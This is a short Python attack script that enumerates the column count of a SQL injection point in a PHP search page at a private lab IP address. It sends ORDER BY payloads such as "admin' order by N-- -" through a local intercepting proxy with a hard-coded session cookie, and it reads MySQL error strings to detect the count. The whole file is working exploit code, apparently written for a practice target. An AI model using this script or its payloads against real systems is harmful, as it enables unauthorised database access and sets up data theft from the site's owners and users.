import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# CONFIGURATION ZONE
# ==========================================

PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

IP ="192.168.219.16"
VALUE="admin"

COOKIES = {
    'PHPSESSID': 'bde10d96950e1de84312dbb4659dffe0'
}

ERROR_STRING = "Unknown column"

routes = "search.php"

# ==========================================

def exploit_sqli_column_number(url):
    for i in range(1, 50):
        # Native MySQL comment character '# or -- -' bypasses trailing '%' structures cleanly
        sql_payload = f"{VALUE}' order by {i}-- -" 
        
        data = {
            "item": sql_payload
        }
        
        try:
            r = requests.post(url, data=data, verify=False, proxies=PROXIES, cookies=COOKIES)
            res = r.text
            
            # Check for the specified out-of-bounds column error string
            if ERROR_STRING in res:
                print(f"[+] Triggered database limit at column: {i}")
                return i - 1
                
            elif "SQL syntax" in res and i > 1:
                # Fallback check if the database crashes entirely on an invalid count
                print(f"[+] Syntax error triggered at column: {i}")
                return i - 1
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return False
            
    return False # Returns False only if the loop reaches 50 without matching an error

if __name__ == "__main__":
    url = f"http://{IP}/{routes}"

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    
    if num_col:
        print(f"The number of columns is {num_col}.")
    else:
        print("[-] The SQLi attack was not successful.")